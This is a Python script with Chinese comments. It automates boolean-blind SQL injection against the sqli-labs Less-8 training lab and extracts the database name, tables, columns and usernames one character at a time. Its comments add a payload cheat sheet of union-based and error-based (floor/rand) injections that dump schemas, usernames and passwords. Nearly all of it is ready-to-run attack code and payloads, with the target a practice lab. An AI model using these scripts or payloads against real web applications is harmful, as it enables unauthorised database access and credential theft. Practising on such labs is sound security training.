#! /usr/bin/env python3
# coding=utf-8
# __author__: leezp
# __date__: 2019-09-03
import requests


# 盲注(bool型)
# substr,ascii
# sql注入爆数据库名长度，库名，表名，字段名
# 默认不区分大小写，可以爆出忽略大小写字母数字组合的用户名密码

def database_len():
    for i in range(1, 20):
        url = '''http://192.168.255.151:8081/sqli-labs-master/Less-8/index.php'''
        payload = '''?id=1' and length(database())>%s''' % i
        # print(url+payload+'%23')
        r = requests.get(url + payload + '%23')
        if not 'You are in' in r.text:
            print('database_length:', i)
            break
        else:
            pass


def database_name():
    name = ''
    flag = False
    for j in range(1, 20):
        if flag:
            break
        flag = True
        for i in 'sqcwertyuioplkjhgfdazxvbnm_':
            url = "http://192.168.255.151:8081/sqli-labs-master/Less-8/index.php?id=1' and substr(database(),%d,1)='%s'" % (
                j, i)
            # print(url + '%23')
            r = requests.get(url + '%23')
            if 'You are in' in r.text:
                flag = False
                name = name + i
                print(name)
                break
    print('database_name:', name)


def table_name():
    switch = False
    for k in range(0, 19):
        if switch:
            break
        switch = True
        name = ''
        flag = False
        for j in range(1, 20):
            if flag:
                break
            flag = True
            for i in 'sqcwertyuioplkjhgfdazxvbnm_':
                url = "http://192.168.255.151:8081/sqli-labs-master/Less-8/index.php?id=1' and substr((select table_name from information_schema.tables where table_schema=database() limit %d,1),%d,1)='%s'" % (
                    k, j, i)
                # print(url + '%23')
                r = requests.get(url + '%23')
                if 'You are in' in r.text:
                    flag = False
                    switch = False
                    name = name + i
                    print(name)
                    break
        print('table_name:', name)


def column_name():
    switch = False
    for k in range(0, 19):
        if switch:
            break
        switch = True
        name = ''
        flag = False
        for j in range(1, 20):
            if flag:
                break
            flag = True
            for i in 'sqcwertyuioplkjhgfdazxvbnm_':
                url = "http://192.168.255.151:8081/sqli-labs-master/Less-8/index.php?id=1' and substr((select column_name from information_schema.columns where table_name='users' and table_schema='security' limit %d,1),%d,1)='%s'" % (
                    k, j, i)
                # print(url + '%23')
                r = requests.get(url + '%23')
                if 'You are in' in r.text:
                    flag = False
                    switch = False
                    name = name + i
                    print(name)
                    break
        print('column_name:', name)


# 默认不区分大小写，可以爆出忽略大小写字母数字组合的用户名密码
def field_name():
    switch = False
    for k in range(0, 19):
        if switch:
            break
        switch = True
        name = ''
        flag = False
        for j in range(1, 20):
            if flag:
                break
            flag = True
            for i in 'sqcwertyuioplkjhgfdazxvbnm_1234567890':
                url = "http://192.168.255.151:8081/sqli-labs-master/Less-8/index.php?id=1' and substr((select username from security.users  limit %d,1),%d,1)='%s'" % (
                    k, j, i)
                # print(url + '%23')
                r = requests.get(url + '%23')
                if 'You are in' in r.text:
                    flag = False
                    switch = False
                    name = name + i
                    print(name)
                    break
        print('field_name:', name)


# 联合查询:
# 前提: select 列数和关联表的columns一致，否则会报如下错误
# The used SELECT statements have a different number of columns
# 查所有数据库名
# union select 1,(select group_concat(schema_name) from information_schema.schemata),3%23
# 查第一张表名
# union select 1,table_name,3 from information_schema.tables where table_schema=database()%23
# 查第一列名
# union select 1,column_name,3 from information_schema.columns where table_schema=database() and table_name='emails' %23
# 查第一列第一个值
# union select 1,查到的列名替换,3 from security.emails %23

# 有回显 （联合查询）
# 查数据库版本
# union select 1,@@version,3%23
# 查当前数据库名
# union select 1,database(),3%23
# 查指定数据库所有表
# union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema='security')%23
# 查指定数据库指定表所有columns
# union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema='security')%23
# 查询指定数据库用户表所有用户名密码
# union select 1,2,(select group_concat(username) from security.users)--+
# union select 1,2,(select group_concat(password) from security.users)%23

# 无回显 (报错注入)
# and (select 1 from (select count(*),concat((payload),floor (rand(0)*2))x from information_schema.tables group by x)a)
# 查询当前数据库
# and (select 1 from (select count(*),concat(((select database())),floor (rand(0)*2))x from information_schema.tables group by x)a) --+
# 查询所有数据库
# and (select 1 from (select count(*),concat(((select group_concat(schema_name) from information_schema.schemata)),floor (rand(0)*2))x from information_schema.tables group by x)a) --+
# 数据库报错 #Subquery returns more than 1 row  # 因为group_concat函数，说明这里数据库名组成的字符串长度超过了64位，要使用limit
# 查询第一个数据库
# and (select 1 from (select count(*),concat(((select schema_name from information_schema.schemata limit 0,1)),floor (rand(0)*2))x from information_schema.tables group by x)a) --+
# 这个1是floor报错语句中输出的也一部分（无论输出什么结果，都会有这个1），为了防止某些时候，我们误以为这个1也是我们查询结果的一部分，可以使用';'与它分开，语句如下：
# and (select 1 from (select count(*),concat(((select concat(schema_name,';') from information_schema.schemata limit 0,1)),floor (rand(0)*2))x from information_schema.tables group by x)a) --+
# 更改payload limit 1,1 一个个的查询我们要找的数据即可
# 查询指定数据库第一张表
# and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema='security' limit 0,1),floor (rand(0)*2))x from information_schema.tables group by x)a)--+
# 更改payload limit 1,1 一个个的查询我们要找的数据即可
# 查指定数据库指定表第一column （ 更改payload limit 1,1 一个个的查询我们要找的数据即可）
# and (select 1 from (select count(*),concat((select column_name from information_schema.columns where table_name='users' and table_schema='security' limit 0,1),floor (rand(0)*2))x from information_schema.tables group by x)a)--+
# 查询指定数据库用户表指定column第一个字段
# and (select 1 from (select count(*),concat((select username from security.users LIMIT 0,1),floor (rand(0)*2))x from information_schema.tables group by x)a)--+


# for test
# 获取第一张表
def firsttable_name():
    url = "http://192.168.255.151:8081/sqli-labs-master/Less-8/index.php?id=1' union select 1,table_name,3 from information_schema.tables where table_schema=database()%23"
    r = requests.get(url + '%23')
    print(r.text)


database_len()
database_name()
table_name()
column_name()
field_name()
# firsttable_name()
